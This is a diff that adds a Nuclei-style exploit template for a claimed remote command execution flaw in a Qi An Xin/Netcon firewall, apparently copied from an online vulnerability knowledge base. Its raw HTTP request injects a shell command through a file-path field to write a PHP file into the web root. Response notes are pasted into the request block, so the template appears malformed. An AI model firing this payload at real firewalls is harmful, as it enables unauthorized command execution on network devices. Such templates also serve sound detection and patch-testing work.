@@ -1,0 +1,39 @@
+id: poc-oxv65waiun8m122p
+info:
+  name: 奇安信网康科技防火墙远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oxv65waiun8m122p'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: oxv65waiun8m122p
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /directdata/direct/router HTTP/1.1
+
+
+
+
+    {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo ''dudesuite'' >/var/www/html/dudesuite.php"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?success)(?=.*?true).*?$
+
+
+    # 上传文件定位
+
+    /dudesuite.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
